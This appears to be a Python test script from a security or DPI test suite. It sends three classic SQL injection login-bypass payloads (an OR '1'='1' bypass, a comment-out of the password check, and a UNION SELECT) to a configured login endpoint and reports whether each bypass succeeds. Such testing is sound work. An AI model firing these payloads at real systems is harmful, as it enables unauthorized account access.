#!/usr/bin/env python3
import sys
import os
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils import log_test, print_header, print_summary, reset_results, GREEN, RED, BOLD, RESET, CYAN
import config


def run():
    print_header("DPI: SQL Injection Tests (TC-SQLI-01, TC-SQLI-02, TC-SQLI-03)")

    payloads = [
        ("TC-SQLI-01", "OR bypass",
         {"username": "admin' OR '1'='1'--", "password": "irrelevant"}),
        ("TC-SQLI-02", "Comment-out password",
         {"username": "admin' --", "password": "irrelevant"}),
        ("TC-SQLI-03", "UNION SELECT injection",
         {"username": "admin' UNION SELECT 1,'admin','admin123'--", "password": "irrelevant"}),
    ]

    success_keywords = ["Welcome", "Dashboard", "profile", "Login successful"]

    for tc_id, desc, data in payloads:
        try:
            r = requests.post(
                f"{config.WEB_BASE}/login",
                json=data,
                timeout=config.REQUEST_TIMEOUT,
                allow_redirects=False,
            )
            passed = False
            detail = f"HTTP {r.status_code}"
            if r.status_code == 302:
                passed = True
                detail += f" redirect to {r.headers.get('Location', 'N/A')}"
            else:
                body = r.text.lower()
                for kw in success_keywords:
                    if kw.lower() in body:
                        passed = True
                        detail += f" contains '{kw}'"
                        break
            if not passed:
                detail += " - no success indicator found"
            log_test(tc_id, desc, passed, detail)
        except requests.exceptions.ConnectionError:
            log_test(tc_id, desc, False, f"Connection refused to {config.WEB_BASE}")
        except Exception as e:
            log_test(tc_id, desc, False, str(e))


if __name__ == "__main__":
    reset_results()
    run()
    ok = print_summary()
    sys.exit(0 if ok else 1)
